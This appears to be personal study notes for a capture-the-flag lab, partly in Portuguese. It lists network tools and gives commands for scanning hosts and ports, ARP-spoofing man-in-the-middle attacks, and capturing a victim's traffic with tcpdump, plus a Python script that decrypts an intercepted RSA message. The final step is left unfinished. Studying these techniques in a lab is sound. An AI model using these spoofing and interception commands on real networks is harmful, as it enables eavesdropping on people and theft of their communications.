
## Links
1. [Find All Live Hosts IP Addresses Connected](https://www.geeksforgeeks.org/find-all-live-hosts-ip-addresses-connected-on-network-in-linux/)
2. [Man in the middle](https://www.golinuxcloud.com/man-in-the-middle-attack-arp-spoofing/)


## Network common tools
- whois
- nslookup
- tcpdump
- netstat
- nc (netcat)
- nmap
- arpspoof (redirects packets from a target host (or all hosts) on the LAN intended for 
another host on the LAN by forging ARP replies.)
- dnsspoof


## Usefull commands
#### Check ip
- ip a

#### Discover hosts
- ip a
- nmap -sn <ip>

#### Check open ports
- nmap -p 0-65535 <ip>

#### Discover Gateway
- ip route | grep default

#### Pretend to be the router or the victim (Man in the Middle)
1. Pretend to be the router
- arpspoof -i <interface> -t <victim> <gateway_ip>
2. Pretend to be the victim to the router
- arpspoof -i <interface> -t <gateway_ip> <victim> 


## CTF
#### Farejando pacotes
1. Check hosts in the same network
- ip a
- nmap -sn 172.31.0.0/24

2. Check which of them are communicating with arp
- tcpdump -i eth0 arp


#### Mensagem Cifrada (Man in the middle)
1. Check the Gateway and the communicating hosts
- ip route | grep default
- tcpdump -i eth0 arp

2. Tell the victim we are the destination
- arpspoof -i <interface> -t <victim_ip> <destination_ip>

3. Check the packages from vances and from alice
- tcpdump -i eth0 src <victim_ip> -A | tee content.dat

4. Get the cipher message from comunication content

5. Generate the private key from the public RSA [RsaCtfTool](https://github.com/RsaCtfTool/RsaCtfTool)

6. Install the library and run the following python script to get the message `pip install cryptography`
```
from cryptography.hazmat.primitives import serialization
from cryptography.hazmat.backends import default_backend
from Crypto.Util.number import bytes_to_long, long_to_bytes

# Ciphertext as an integer
ciphertext_int = int(
    "24172467435619340375323632165733456805473767354960620686935367004883386792239921504896957347809426291703888521786717763520262131607974888976430627385945750219968938988267083"
)

# Read and load private key
with open("./vances_private.pem", "rb") as key_file:
    private_key = serialization.load_pem_private_key(
        key_file.read(),
        password=None,
        backend=default_backend()
    )

# Extract RSA numbers
private_numbers = private_key.private_numbers()
n = private_numbers.public_numbers.n
d = private_numbers.d

# Decrypt
plaintext_int = pow(ciphertext_int, d, n)
plaintext_bytes = long_to_bytes(plaintext_int)

print("Decrypted message:", plaintext_bytes.decode(errors="ignore"))
```


####  Espufando Alice 
1. Verificar as portas abertas da alice
- nmap -p 0-65535 172.31.0.99

2. Conectar a porta da alice
- nc alice_pc 8349

3.
- 

